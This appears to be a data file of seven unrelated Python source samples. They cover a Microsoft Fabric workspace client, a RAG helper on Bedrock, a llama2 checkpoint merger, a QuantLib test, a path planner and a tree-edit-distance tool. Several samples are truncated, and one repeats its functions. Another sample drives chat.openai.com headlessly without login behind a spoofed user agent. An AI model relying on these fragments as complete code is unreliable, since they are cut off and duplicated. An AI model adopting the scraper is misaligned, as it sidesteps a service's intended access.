    "import json \nimport requests\nfrom time import sleep\nfrom msfabricpysdkcore.item import Item\nfrom msfabricpysdkcore.long_running_operation import check_long_running_operation\n\nclass Workspace:\n    \"\"\"Class to represent a workspace in Microsoft Fabric\"\"\"\n\n    def __init__(self, id, display_name, description, type, auth, capacity_id = None) -> None:\n        self.id = id\n        self.display_name = display_name\n        self.description = description\n        self.type = type\n        self.capacity_id = capacity_id\n\n        self.auth = auth\n        \n    \n    def from_dict(dict,  auth):\n        \"\"\"Create a Workspace object from a dictionary\"\"\"\n        return Workspace(id=dict['id'], display_name=dict['displayName'], description=dict['description'], type=dict['type'], capacity_id=dict.get('capacityId', None),\n                         auth=auth)\n    \n    def __str__(self) -> str:\n        \"\"\"Return a string representation of the workspace object\"\"\"\n        dict_ = {\n            'id': self.id,\n            'display_name': self.display_name,\n            'description': self.description,\n            'type': self.type,\n            'capacity_id': self.capacity_id\n        }\n        return json.dumps(dict_, indent=2)\n    \n    def get_role_assignments(self):\n        \"\"\"Get role assignments for the workspace\"\"\"\n        url = f\"https://api.fabric.microsoft.com/v1/workspaces/{self.id}/roleAssignments\"\n\n        for _ in range(10):\n            response = requests.get(url=url, headers=self.auth.get_headers())\n            if response.status_code == 429:\n                print(\"Too many requests, waiting 10 seconds\")\n                sleep(10)\n                continue\n            if response.status_code not in (200, 429):\n                print(response.status_code)\n                print(response.text)\n                raise Exception(f\"Error getting role assignments: {response.text}\")\n            break\n\n        return json.loads(response.text)\n    \n    def delete(self):\n        \"\"\"Delete the workspace\"\"\"\n        url = f\"https://api.fabric.microsoft.com/v1/workspaces/{self.id}\"\n\n        for _ in range(10):\n            response = requests.delete(url=url, headers=self.auth.get_headers())\n            if response.status_code == 429:\n                print(\"Too many requests, waiting 10 seconds\")\n                sleep(10)\n                continue\n            if response.status_code not in (200, 429):\n                print(response.status_code)\n                print(response.text)\n                raise Exception(f\"Error deleting workspace: {response.text}\")\n            break\n\n        return response.status_code\n    \n    # function to add workpace role assignment\n    def add_role_assignment(self, role, principal):\n        \"\"\"Add a role assignment to the workspace\"\"\"\n        url = f\"https://api.fabric.microsoft.com/v1/workspaces/{self.id}/roleAssignments\"\n\n        payload = {\n            'principal': principal,\n            'role': role\n        }\n\n        for _ in range(10):\n            response = requests.post(url=url, headers=self.auth.get_headers(), data=json.dumps(payload))\n            if response.status_code == 429:\n                print(\"Too many requests, waiting 10 seconds\")\n                sleep(10)\n                continue\n            if response.status_code not in (200, 429):\n                print(response.status_code)\n                print(response.text)\n                raise Exception(f\"Error adding role assignments: {response.text}\")\n            break\n\n        return response.status_code\n    \n\n    def delete_role_assignment(self, principal_id):\n        \"\"\"Delete a role assignment from the workspace\"\"\"\n        url = f\"https://api.fabric.microsoft.com/v1/workspaces/{self.id}/roleAssignments/{principal_id}\"\n\n        for _ in range(10):\n            response = requests.delete(url=url, headers=self.auth.get_headers())\n            if response.status_code == 429:\n                print(\"Too many requests, waiting 10 seconds\")\n                sleep(10)\n                continue\n            if response.status_code not in (200, 429):\n                print(response.status_code)\n                print(response.text)\n                raise Exception(f\"Error deleting role assignments: {response.text}\")\n            break\n\n        \n        return response.status_code\n    \n    def update(self, display_name = None, description = None):\n        \"\"\"Update the workspace\"\"\"\n        url = f\"https://api.fabric.microsoft.com/v1/workspaces/{self.id}\"\n\n        body = dict()\n        if display_name:\n            body[\"displayName\"] = display_name\n        if description:\n            body[\"description\"] = description\n\n\n        for _ in range(10):\n            response = requests.patch(url=url, headers=self.auth.get_headers(), json=body)\n            if response.status_code == 429:\n                print(\"Too many requests, waiting 10 seconds\")\n                sleep(10)\n                continue\n            if response.status_code not in (200, 429):\n                print(resp",
    "import time\nimport asyncio\nimport argparse\nfrom pyppeteer import launch\n\nclass GPT:\n    def __init__(self, prompt, streaming=True):\n        self.prompt = prompt\n        self.streaming = streaming\n        self.browser = None\n        self.page = None\n        self.session_active = True\n        self.last_message_id = None\n\n    async def start(self):\n        self.browser = await launch(headless=True)\n        self.page = await self.browser.newPage()\n        await self.page.setUserAgent(\"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1\")\n        await self.page.goto('https://chat.openai.com', waitUntil='networkidle0')\n        await self.handle_prompt(self.prompt)\n\n    async def handle_prompt(self, prompt_text):\n        prompt_textarea = await self.page.querySelector('#prompt-textarea')\n        if prompt_textarea is None:\n            print(\"Cannot find the prompt input on the webpage.\\nPlease check whether you have access to chat.openai.com without logging in via your browser.\")\n            self.session_active = False\n            await self.close()\n            return \n        \n        await self.page.type('#prompt-textarea', prompt_text, {'delay': 100})\n        \n        try:\n            await self.page.click('[data-testid=\"send-button\"]')\n        except Exception as e:\n            print(f\"Failed to click the send button: {str(e)}\")\n        \n        await self.wait_for_and_print_new_response()\n\n\n    async def wait_for_and_print_new_response(self):\n        await self.wait_for_initial_response()\n        await self.handle_streaming_response()\n\n    async def wait_for_initial_response(self):\n        start_time = time.time()\n        timeout = 30\n        while (time.time() - start_time) < timeout:\n            assistant_messages = await self.page.querySelectorAll('div[data-message-author-role=\"assistant\"]')\n            if assistant_messages:\n                last_message = assistant_messages[-1]\n                is_thinking = await last_message.querySelector('.result-thinking')\n                if not is_thinking:\n                    self.last_message_id = await self.page.evaluate('(element) => element.getAttribute(\"data-message-id\")', last_message)\n                    return\n            await asyncio.sleep(0.1)\n        print(\"Timed out waiting for the initial response.\")\n\n    async def handle_streaming_response(self):\n        previous_text = \"\"\n        complete_response = \"\"\n        new_content_detected = False\n        while not new_content_detected:\n            assistant_messages = await self.page.querySelectorAll('div[data-message-author-role=\"assistant\"]')\n            if assistant_messages:\n                last_message = assistant_messages[-1]\n                current_message_id = await self.page.evaluate('(element) => element.getAttribute(\"data-message-id\")', last_message)\n                \n                if current_message_id == self.last_message_id:\n                    current_text = await self.page.evaluate('(element) => element.textContent', last_message)\n                    if current_text != previous_text:\n                        if self.streaming:\n                            print(current_text[len(previous_text):], end='', flush=True)\n                        else:\n                            complete_response += current_text[len(previous_text):]\n\n                    previous_text = current_text\n                    is_streaming = await last_message.querySelector('.result-streaming')\n                    if not is_streaming:\n                        new_content_detected = True\n                else:\n                    self.last_message_id = current_message_id\n            await asyncio.sleep(0.1)\n        \n        if not self.streaming:\n            print(complete_response.rstrip())\n\n    async def close(self):\n        await self.browser.close()\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='ChatGPT without login')\n    parser.add_argument('-p', '--prompt', type=str, default=\"Hello, GPT\", help='The initial prompt text to send to ChatGPT')\n    parser.add_argument('-ns', '--no-streaming', dest='streaming', action='store_false', help='Disable streaming of ChatGPT responses')\n    args = parser.parse_args()\n\n    async def main():\n        session = GPT(args.prompt, args.streaming)\n        try:\n            await session.start()\n            while session.session_active:\n                next_prompt = input(\"\\n|>: \")\n                if next_prompt.lower() == 'exit':\n                    break\n                await session.handle_prompt(next_prompt)\n        except KeyboardInterrupt:\n            print(\"Interrupted by user, closing...\")\n        except Exception as e:\n            print(f\"An error occurred: {e}\")\n        finally:\n            await session.close()\n\n    asyncio.run(main())\n",
    "## Import Python libraries and custom modules\nimport eda_assistant_model_options\nimport json\nimport boto3\nimport os\nimport random\n# from utils import opensearch, secret\n\n##Bedrock and Bedrock Embeddings\nfrom langchain_community.embeddings import BedrockEmbeddings\nfrom langchain.llms.bedrock import Bedrock\nfrom langchain_community.chat_models import BedrockChat\n\n## Data Ingestion\nfrom langchain.retrievers.bedrock import AmazonKnowledgeBasesRetriever\nfrom langchain_community.document_loaders import DirectoryLoader\n\n## Data splitting\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\n\n## Embeddings\nfrom langchain_community.embeddings import BedrockEmbeddings\n\n## Vector Stores\nfrom langchain_community.vectorstores import FAISS\n# from langchain_community.vectorstores import OpenSearchVectorSearch\n\n## Chains\nfrom langchain_core.runnables import RunnableParallel, RunnablePassthrough\nfrom langchain_core.output_parsers import StrOutputParser\n\n## LLM Models\nfrom langchain.chains import RetrievalQA\nfrom langchain.prompts import PromptTemplate\n\n#Bedrock Client\nbedrock_client = boto3.client('bedrock-runtime')\nregion = 'us-west-2'\n\n\n# Get specific instructions for llm\ndef get_langchain_system_prompt (modelID):\n    \"\"\"Generate a system prompt for the language model.\n    \n    Args:\n    None\n\n    Returns:\n    A string to be used as the initial prompt for the language model.\n    \"\"\"\n\n    system_prompt = \"You are an expert in semiconductor chip design and electronic design automation. Your goal is to provide informative and substantive responses to assist in semiconductor design engineering. When asked for any code related tasks, just output the code, skip any explanation. You are to respond in markdown format. If you dont know the exact answer, just say you don't know. Do not make up an answer\"\n    return system_prompt\n\n\n## Get model kwargs \ndef get_langchain_model_kwargs(modelID, temperature = 0.1, topk = 1, max_tokens=10000):\n    \"\"\"Generate a dictionary of model kwargs for the language model.\n\n    Args:\n    Model ID, Temperature, Top K, Max Tokens\n\n    Returns:\n    A dictionary of model kwargs for the language model.\n    \"\"\"\n\n    if modelID in eda_assistant_model_options.anthropic_models:\n        model_kwargs = {\n                \"max_tokens\": max_tokens,\n                \"temperature\": temperature,\n                \"system\" : get_langchain_system_prompt(modelID),\n                \"top_k\": topk,\n                \"top_p\": 1,\n        }\n    elif modelID in eda_assistant_model_options.mistral_models:\n        model_kwargs = {\n            \"temperature\": temperature, #float\n            \"top_k\": topk, #int\n            \"max_tokens\": max_tokens #int\n        }\n    else: #default                                   \n        model_kwargs = {\n            \"temperature\": temperature,\n            \"top_k\": topk,\n            \"max_tokens_to_sample\": max_tokens\n        }\n    return model_kwargs\n\n\n##Get Amazon Knowledge Bases Retriever\ndef get_langchain_kb_retriever(kb_id):\n    \"\"\"Generate a knowledge base retriever for the language model.\n\n    Args:\n    Knowledge Base ID\n\n    Returns:\n    A knowledge base retriever for the language model.\n    \"\"\"\n    retriever = AmazonKnowledgeBasesRetriever(\n            knowledge_base_id=kb_id,\n            retrieval_config={\"vectorSearchConfiguration\": \n                            {\"numberOfResults\": 4,\n                            'overrideSearchType': \"HYBRID\", # optional\n                            }\n                            },\n        )\n    return retriever\n\n\n##Get Documents from File System:\ndef get_langchain_docs_fs(path):\n    \"\"\"Generate a list of documents from a file system path.\n\n    Args:\n    Path to the file system directory containing PDF documents.\n\n    Returns:\n    A list of documents from the file system directory.\n    \"\"\"\n    loader = DirectoryLoader(path, use_multithreading=True, show_progress=True)\n    docs = loader.load()\n    print(\"-I- Total Files loaded: \", len(docs))\n    print(\"-I- File paths loaded: \")\n    doc_sources = [doc.metadata['source']  for doc in docs]\n    for fd in doc_sources:\n        print(\"-I- \", fd)\n    return docs\n\n\n## Split into chunks\ndef get_langchain_split_chunks(docs, chunksize):\n    \"\"\"Split a list of documents into chunks of a specified size.\n\n    Args:\n    docs: A list of documents.\n    chunksize: The size of each chunk.\n\n    Returns:\n    A list of chunks of the specified size.\n    \"\"\"\n    text_splitter = RecursiveCharacterTextSplitter(\n        chunk_size=chunksize, chunk_overlap=20, length_function=len\n    )\n    chunks = text_splitter.split_documents(docs)\n    return chunks\n\n\n## Create an Embeddings model\ndef create_langchain_vector_embedding_using_bedrock(bedrock_embedding_model_id):\n    \"\"\"Create a vector embedding model using the Bedrock Embeddings library.\n\n    Args:\n    bedrock_embedding_model_id: The ID of the embedding model to use.\n\n    Returns:\n    A vector embedding model using the Bedrock Embeddings library.\n    \"\"\"\n    bedrock_embeddings",
    "r\"\"\"Utility to merge sharded weights of llama2 model into a single file.\n\nUsage:\nexport input_ckpt_dir=/path/to/llama2/weight/dir\nexport output_ckpt_dir=/tmp/llama2/\npython convert_checkpoint.py \\\n    --input_checkpoint_dir=${input_ckpt_dir} \\\n    --output_checkpoint_dir=${output_ckpt_dir}\n\"\"\"\n\nfrom jetstream_pt import quantize\nfrom collections.abc import Sequence\nimport gc\nimport hashlib\nimport json\nimport os\n\nfrom absl import app\nfrom absl import flags\nfrom etils import epath\nimport torch\nfrom google.cloud import storage\nimport time\n\n_INPUT_CHECKPOINT_DIR = epath.DEFINE_path(\n    'input_checkpoint_dir',\n    None,\n    'The input dir containing llama2 model weights sharded across files.',\n)\n\n_OUTPUT_CHECKPOINT_DIR = epath.DEFINE_path(\n    'output_checkpoint_dir',\n    None,\n    'The output dir containing llama2 model weights merged in a single file.',\n)\n\n_MINIMIZE_MEMORY_FOOTPRINT = flags.DEFINE_bool(\n    'minimize_memory_footprint',\n    True,\n    'When set to true, reduce memory usage by staging in-memory data on disk',\n)\n\n_OUTPUT_SAFETENSORS = flags.DEFINE_bool('output_safetensors', True, 'When set to true, save to HugginFace SafeTensors format')\n_QUANTIZE = flags.DEFINE_bool('quantize', False, 'When set to true, produces quantized weights')\n\n# ParallelEmbedding is col partitioned across the shards.\n# ColumnParallelLinear is row partitioned across shards due to transpose.\n# RowParallelLinear is col partitioned across shards due to transpose.\n# None is no partitioning and tensor should be identical across shards\n_WEIGHT_SHARDING_TYPE = {\n    'tok_embeddings.weight': 'ParallelEmbedding',\n    'rope.freqs': None,\n    'attention.wq.weight': 'ColumnParallelLinear',\n    'attention.wk.weight': 'ColumnParallelLinear',\n    'attention.wv.weight': 'ColumnParallelLinear',\n    'attention.wo.weight': 'RowParallelLinear',\n    'feed_forward.w1.weight': 'ColumnParallelLinear',\n    'feed_forward.w2.weight': 'RowParallelLinear',\n    'feed_forward.w3.weight': 'ColumnParallelLinear',\n    'attention_norm.weight': None,\n    'ffn_norm.weight': None,\n    'norm.weight': None,\n    'output.weight': 'ColumnParallelLinear',\n}\n\n_QUANTIZED_WEIGHTS_TO_SCALER_NAME= {\n    'tok_embeddings.weight': 'tok_embeddings.weight_scaler',\n    'attention.wq.weight': 'attention.wq.weight_scaler',\n    'attention.wk.weight': 'attention.wk.weight_scaler',\n    'attention.wv.weight': 'attention.wv.weight_scaler',\n    'attention.wo.weight': 'attention.wo.weight_scaler',\n    'feed_forward.w1.weight': 'feed_forward.w1.weight_scaler',\n    'feed_forward.w2.weight': 'feed_forward.w2.weight_scaler',\n    'feed_forward.w3.weight': 'feed_forward.w3.weight_scaler',\n    'output.weight': 'output.weight_scaler',\n}\n\ndef _quantize_state_dict(state_dict):\n    updated_weights = {}\n    for key, val in state_dict.items():\n        for qname, qscale_name in _QUANTIZED_WEIGHTS_TO_SCALER_NAME.items():\n            if key.endswith(qname):\n                new_weights, scaler = quantize.quantize_torch_int8(val, reduce_axis=(1, ))\n                updated_weights[key] = new_weights\n                scale_name = key[:-len(qname)] + qscale_name\n                updated_weights[scale_name] = scaler\n    state_dict.update(updated_weights)\n    return state_dict\n\n\n_QUANTIZE_LINEAR_WEIGHTS = {\n    'attention.wq.weight',\n    'attention.wk.weight',\n    'attention.wv.weight',\n    'attention.wo.weight',\n    'feed_forward.w1.weight',\n    'feed_forward.w2.weight',\n    'feed_forward.w3.weight',\n    'output.weight',\n}\n\ndef _quantize_state_dict(state_dict):\n    updated_weights = {}\n    for key, val in state_dict.items():\n        for qname in _QUANTIZE_LINEAR_WEIGHTS:\n            if key.endswith(qname):\n                new_weights, scaler = quantize.quantize_torch_int8(val, reduce_axis=(1, ))\n                updated_weights[key] = new_weights\n                scale_name = key + '_scaler'\n                updated_weights[scale_name] = scaler.squeeze()\n    tok_weights, tok_scalers = quantize.quantize_torch_int8(state_dict['tok_embeddings.weight'], reduce_axis=(0, ))\n    updated_weights['tok_embeddings.weight'] = tok_weights\n    updated_weights['tok_embeddings.weight_scaler'] = tok_scalers.squeeze()\n    state_dict.update(updated_weights)\n    return state_dict\n\n\n_QUANTIZE_LINEAR_WEIGHTS = {\n    'attention.wq.weight',\n    'attention.wk.weight',\n    'attention.wv.weight',\n    'attention.wo.weight',\n    'feed_forward.w1.weight',\n    'feed_forward.w2.weight',\n    'feed_forward.w3.weight',\n    'output.weight',\n}\n\ndef _quantize_state_dict(state_dict):\n    updated_weights = {}\n    for key, val in state_dict.items():\n        for qname in _QUANTIZE_LINEAR_WEIGHTS:\n            if key.endswith(qname):\n                new_weights, scaler = quantize.quantize_torch_int8(val, reduce_axis=(1, ))\n                updated_weights[key] = new_weights\n                scale_name = key + '_scaler'\n                updated_weights[scale_name] = scaler.squeeze()\n    tok_weights, tok_scalers = quantize.quantize_torch_int8(state_dict['tok_emb",
    "# coding=utf-8-unix\n\"\"\"\n Copyright (C) 2018 Wojciech \u015alusarski\n Copyright (C) 2024 Xcelerit Computing Limited.\n\n This file is part of QuantLib-Risks, a Python wrapper for QuantLib enabled\n for risk computation using automatic differentiation. It uses XAD,\n a fast and comprehensive C++ library for automatic differentiation.\n\n QuantLib-Risks and XAD are free software: you can redistribute it and/or modify\n it under the terms of the GNU Affero General Public License as published\n by the Free Software Foundation, either version 3 of the License, or\n (at your option) any later version.\n\n QuantLib-Risks is distributed in the hope that it will be useful,\n but WITHOUT ANY WARRANTY; without even the implied warranty of\n MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n GNU Affero General Public License for more details.\n\n You should have received a copy of the GNU Affero General Public License\n along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n QuantLib is free software: you can redistribute it and/or modify it\n under the terms of the QuantLib license.  You should have received a\n copy of the license along with this program; if not, please email\n <quantlib-dev@lists.sf.net>. The license is also available online at\n <http://quantlib.org/license.shtml>.\n\n This program is distributed in the hope that it will be useful, but WITHOUT\n ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\n FOR A PARTICULAR PURPOSE.  See the license for more details.\n\"\"\"\n\nimport QuantLib_Risks as ql\nimport unittest\n\n\nclass IborIndexTest(unittest.TestCase):\n    @classmethod\n    def setUpClass(cls):\n        cls.euribor3m = ql.Euribor3M()\n\n    def setUp(self):\n        self.euribor3m.clearFixings()\n        # values are not real due to copyrights of the fixing\n        self.euribor3m.addFixing(ql.Date(17, 7, 2018), -0.3)\n        self.euribor3m.addFixings([ql.Date(12, 7, 2018), ql.Date(13, 7, 2018)], [-0.3, -0.3])\n\n    def testAddFixingFail(self):\n        \"\"\"Testing for RuntimeError while trying to overwrite fixing value\"\"\"\n\n        with self.assertRaises(RuntimeError):\n            # attempt to overwrite value that is already set at different level\n            self.euribor3m.addFixing(ql.Date(17, 7, 2018), -0.4)\n\n        with self.assertRaises(RuntimeError):\n            # attempt to overwrite value that is already set at different level\n            self.euribor3m.addFixings([ql.Date(12, 7, 2018), ql.Date(13, 7, 2018)], [-0.4, -0.4])\n\n    def testAddFixing(self):\n        \"\"\"Testing for overwriting fixing value\"\"\"\n\n        force_overwrite = True\n        try:\n            # attempt to overwrite value that is already set at different level\n            self.euribor3m.addFixing(ql.Date(17, 7, 2018), -0.4, force_overwrite)\n            self.euribor3m.addFixings([ql.Date(12, 7, 2018), ql.Date(13, 7, 2018)], [-0.4, -0.4], force_overwrite)\n            # try clearFixings and repeat with original levels\n            self.euribor3m.clearFixings()\n            self.euribor3m.addFixing(ql.Date(17, 7, 2018), -0.3)\n            self.euribor3m.addFixings([ql.Date(12, 7, 2018), ql.Date(13, 7, 2018)], [-0.3, -0.3])\n\n        except RuntimeError as err:\n            raise AssertionError(\"Failed to overwrite index fixixng \" + \"{}\".format(err))\n\n    def testTimeSeries(self):\n        \"\"\"Testing for getting time series of the fixing\"\"\"\n\n        dates = (ql.Date(12, 7, 2018), ql.Date(13, 7, 2018), ql.Date(17, 7, 2018))\n        values = (-0.3, -0.3, -0.3)\n        for expected, actual in zip(dates, self.euribor3m.timeSeries().dates()):\n            self.assertTrue(expected == actual)\n        for expected, actual in zip(values, self.euribor3m.timeSeries().values()):\n            self.assertTrue(expected == actual)\n\n\nif __name__ == \"__main__\":\n    print(\"testing QuantLib\", ql.__version__)\n    unittest.main(verbosity=2)\n",
    "from collections import deque\nimport numpy as np\nimport torch\n\nclass OkayPlan():\n    '''\n    OkayPlan: A real-time path planner for dynamic environment\n    Author: Jinghao Xin\n\n    Paper Web: https://arxiv.org/abs/2401.05019\n    Code Web: https://github.com/XinJingHao/OkayPlan\n              https://github.com/XinJingHao/OkayPlan_ROS\n\n    Cite this algorithm:\n    @misc{OkayPlan,\n      title={OkayPlan: Obstacle Kinematics Augmented Dynamic Real-time Path Planning via Particle Swarm Optimization},\n      author={Jinghao Xin and Jinwoo Kim and Shengjia Chu and Ning Li},\n      year={2024},\n      eprint={2401.05019},\n      archivePrefix={arXiv},\n      primaryClass={cs.RO}}\n\n    Only for non-commercial purposes\n    All rights reserved\n    '''\n    def __init__(self, opt, params):\n        self.dvc = opt.dvc  # \u8fd0\u7b97\u5e73\u53f0\n\n        '''Hyperparameter Initialization'''\n        self.params = params # \u8be5\u7ec4\u53c2\u6570\u7684Group Number=8\n        self.G = 8 # Group\u6570\u91cf\u5e94\u8be5\u4e25\u683c\u7b49\u4e8e\u751f\u6210params\u65f6\u7684\u79cd\u7fa4\u6570\u91cf\n        # Inertia Initialization for 8 Groups:\n        self.w_init = self.params[0:self.G].unsqueeze(-1).unsqueeze(-1)\n        self.w_end = (self.params[0:self.G] * self.params[self.G:(2 * self.G)]).unsqueeze(-1).unsqueeze(-1)\n        self.Max_iterations = opt.Max_iterations  # \u6bcf\u5e27\u7684\u6700\u5927\u8fed\u4ee3\u6b21\u6570\n        self.w_delta = (self.w_init - self.w_end) / self.Max_iterations  # (G,1,1)\n        # Velocity Initialization for 8 Groups:\n        self.v_limit_ratio = self.params[(2 * self.G):(3 * self.G)].unsqueeze(-1).unsqueeze(-1)  # (G,1,1)\n        self.v_init_ratio = 0.7 * self.v_limit_ratio  # (G,1,1)\n        # H Matrix, (4,G=8,1,1):\n        self.Hyper = torch.ones((4, self.G), device=self.dvc)\n        self.Hyper[1] = self.params[(3 * self.G):(4 * self.G)]\n        self.Hyper[2] = self.params[(4 * self.G):(5 * self.G)]\n        self.Hyper[3] = self.params[(5 * self.G):(6 * self.G)]\n        self.Hyper.unsqueeze_(-1).unsqueeze_(-1)\n\n        '''Particle Related'''\n        self.N, self.D = opt.N, opt.D # number of Groups, particles in goups, and particle dimension\n        self.arange_idx = torch.arange(self.G, device=self.dvc)  # \u7d22\u5f15\u5e38\u91cf\n        self.Search_range = opt.Search_range  # search space of the Particles\n        self.Random = torch.zeros((4,self.G,self.N, 1), device=self.dvc)\n        self.Kinmtc = torch.zeros((4, self.G, self.N, self.D), device=self.dvc)  # [V,Pbest,Gbest,Tbest]\n        self.Locate = torch.zeros((4, self.G, self.N, self.D), device=self.dvc) # [0,X,X,X]\n        self.V_offset = 20*opt.map_size/366 # 20\u662f\u9488\u5bf9366\u7684map\u800c\u8a00\u7684,\u8fd9\u91cc\u9700\u8981scale\u4e00\u4e0b\n\n        '''Path Related'''\n        self.NP = opt.NP # \u6bcf\u4e2a\u7c92\u5b50\u6240\u4ee3\u8868\u7684\u8def\u5f84\u7684\u7aef\u70b9\u6570\u91cf\n        self.S = self.NP-1 # \u6bcf\u4e2a\u7c92\u5b50\u6240\u4ee3\u8868\u7684\u8def\u5f84\u7684\u7ebf\u6bb5\u6570\u91cf\n        self.P = self.G*self.N*self.S # \u6240\u6709\u7c92\u5b50\u6240\u4ee3\u8868\u7684\u8def\u5f84\u7684\u7ebf\u6bb5\u603b\u6570\u91cf\n        self.rd_area = 0.5 * (self.Search_range[1] - self.Search_range[0]) / (self.S)  # SEPSO\u4e2d\u5148\u9a8c\u77e5\u8bc6\u521d\u59cb\u5316\u7c92\u5b50\u65f6\u7684\u968f\u673a\u8303\u56f4\n        self.Step_V = opt.Step_V\n\n        '''Auto Truncation'''\n        # For info, check https://arxiv.org/abs/2308.10169\n        self.AT = True\n        self.TrucWindow = 20\n        self.std_Trsd = opt.Quality  # \u81ea\u52a8\u622a\u65ad\u5224\u636e\u4e2d,std\u7684\u9608\u503c: \u8d8a\u5c0f,\u6bcf\u6b21\u89c4\u5212\u8017\u65f6\u8d8a\u591a,\u4f46\u7ed3\u679c\u66f4\u597d\u66f4\u7a33\u5b9a. \u5e94\u5728\u5b9e\u65f6\u6027\u548c\u89c4\u5212\u8d28\u91cf\u95f4\u6298\u8877(\u539f\u8bba\u6587\u4e2d\u53d6\u768410)\n\n        '''Dynamic Prioritized Initialization'''\n        self.DPI = opt.DPI\n\n    def _uniform_random(self, low, high, shape):\n        '''Generate uniformly random number in [low, high) in 'shape' on self.dvc'''\n        return (high - low)*torch.rand(shape, device=self.dvc) + low\n\n    def Priori_Path_Init(self, start, target):\n        '''\u5728\u8d77\u70b9\u548c\u7ec8\u70b9\u4e4b\u95f4\u5747\u5300\u63d2\u503c\u751f\u6210\u521d\u59cb\u5148\u9a8c\u8def\u5f84\uff0c\u6bcf\u6b21\u5bfc\u822a\u524d\u9700\u8981\u6267\u884c\u4e00\u6b21\uff0c\u5bfc\u822a\u4e2d\u65e0\u9700\u6267\u884c'''\n        Path_Xs = (start[0] + (target[0] - start[0]) * torch.arange(self.NP, device=self.dvc) / (self.NP - 1))\n        Path_Ys = (start[1] + (target[1] - start[1]) * torch.arange(self.NP, device=self.dvc) / (self.NP - 1))\n        self.Priori_Path = torch.cat((Path_Xs, Path_Ys))\n\n    def _fix_apex(self):\n        '''\u56fa\u5b9a\u8def\u5f84\u7684\u9996\u672b\u7aef\u70b9, \u6ce8\u610fx_start,y_start,x_target,y_target\u90fd\u662f\u6807\u91cf'''\n        self.Locate[1:4, :, :, 0] = self.x_start\n        self.Locate[1:4, :, :, self.NP] = self.y_start\n        self.Locate[1:4, :, :, self.NP - 1] = self.x_target\n        self.Locate[1:4, :, :, 2 * self.NP - 1] = self.y_target\n\n    def _ReLocate(self):\n        '''\u521d\u59cb\u5316\u7c92\u5b50\u7fa4\u52a8\u529b\u5b66\u7279\u5f81\uff0c\u6bcf\u6b21iterate\u524d\u8981\u6267\u884c\u4e00\u6b21'''\n        # Dynamic Prioritized Initialization // Prioritized Initialization\n        if self.DPI:\n            # OkayPlan Position Init: \u6839\u636e\u5148\u9a8c\u77e5\u8bc6Priori_X(\u4e0a\u6b21\u8fed\u4ee3\u7684Tbest)\u6765\u521d\u59cb\u5316\u7c92\u5b50\u7fa4\n            Mid_points = torch.tensor([[(self.x_start+self.x_target)/2],[(self.y_start+self.y_target)/2]],device=self.dvc).repeat((1,self.NP)).reshape(self.D) #(D,)\n            self.Locate[1:4] = Mid_points + self._uniform_random(low=-self.d2target/2, high=self.d2target/2, shape=(self.G,self.N,self.D))\n            # self.Locate[1:4, :, 0:self.params[53].int()] = Priori_X  # (3,G,RN,D), old version, not necessary\n            self.Locate[1:4, :, 0] = self.Priori_Path  # (3,G,0,D), new version, replace params[53] for 1\n        else:\n            # SEPSO Position Init: From https://github.com/XinJingHao/Real-time-Path-planning-with-SEPSO\n            RN = int(0.25*self.N)\n            self.Locate[1:4] = sel",
    "import re\nfrom typing import Union\nimport stanza\nimport nltk\nfrom nltk.tree import Tree as NLTKTree\nfrom nltk.draw.util import CanvasFrame\nfrom nltk.draw import TreeWidget\nfrom apted import APTED, Config\nfrom apted.helpers import Tree as APTEDTree\n\nclass TreeEditDistanceCalculator:\n    \"\"\"\n    A class for calculating the Tree Edit Distance (TED) between sentences, along with utilities for parsing\n    and visualizing constituency trees.\n    \n    Attributes:\n    language (str): The language configuration for the stanza NLP pipeline.\n    \"\"\"\n\n    def __init__(self, language: str = 'en'):\n        \"\"\"\n        Initializes the TreeEditDistanceCalculator with a specified language for the NLP pipeline.\n        \n        Args:\n        language (str): The language code to be used by the stanza pipeline for parsing sentences.\n        \"\"\"\n        self.nlp = stanza.Pipeline(lang=language, processors='tokenize,pos,constituency', use_gpu=True)\n    \n    def get_constituency_tree(self, sentence: str) -> NLTKTree:\n        \"\"\"\n        Parses a sentence and returns its constituency tree.\n        \n        Args:\n        sentence (str): The sentence to parse.\n        \n        Returns:\n        NLTKTree: The constituency tree of the parsed sentence.\n        \"\"\"\n        doc = self.nlp(sentence)\n        nltk_tree = doc.sentences[0].constituency\n        return nltk_tree\n\n    def remove_non_terminal_labels(self, tree_string: str) -> str:\n        \"\"\"\n        Removes non-terminal labels from a tree string to simplify comparison.\n        \n        Args:\n        tree_string (str): The string representation of a tree.\n        \n        Returns:\n        str: A cleaned tree string without non-terminal labels.\n        \"\"\"\n        cleaned_tree_string = re.sub(r'\\([A-Z$]+ ', '(', tree_string)\n        cleaned_tree_string = re.sub(r'\\s+', '', cleaned_tree_string)\n        return cleaned_tree_string\n\n    def nltk_tree_to_bracket_string(self, tree: NLTKTree) -> str:\n        \"\"\"\n        Converts an NLTK tree to a full bracket string representation.\n        \n        Args:\n        tree (NLTKTree): The NLTK tree to convert.\n        \n        Returns:\n        str: The bracket string representation of the tree.\n        \"\"\"\n        tree_string = str(tree)\n        cleaned_tree_string = self.remove_non_terminal_labels(tree_string)\n        bracket_string = cleaned_tree_string.replace(\")\", \"}\").replace(\"(\", \"{\")\n        return bracket_string\n    \n    def nltk_tree_to_n_bracket_string(self, tree, max_depth=None, current_depth=0):\n        \"\"\"\n        Converts an NLTK tree to a bracket string with an optional depth limitation.\n        \n        Args:\n        tree: The NLTK tree to convert.\n        max_depth (Optional[int]): The maximum depth to include in the conversion.\n        current_depth (int): The current depth in the recursion (used internally).\n        \n        Returns:\n        str: The bracket string representation of the tree with limited depth.\n        \"\"\"\n        if max_depth is not None and current_depth > max_depth or not tree:\n            return \"\"\n\n        tree_string = \"(\" + tree.label() + \" \"\n        if tree.height() > 2:\n            for child in tree:\n                tree_string += self.nltk_tree_to_n_bracket_string(child, max_depth, current_depth + 1)\n        else:\n            tree_string += \" \".join(tree.leaves())\n        tree_string += \")\"\n        return tree_string\n    \n    def clean_string(self, tree_string: str) -> str:\n        \"\"\"\n        Cleans and transforms a tree string to a specific bracket format.\n        \n        Args:\n        tree_string (str): The tree string to clean.\n        \n        Returns:\n        str: The cleaned and formatted tree string.\n        \"\"\"\n        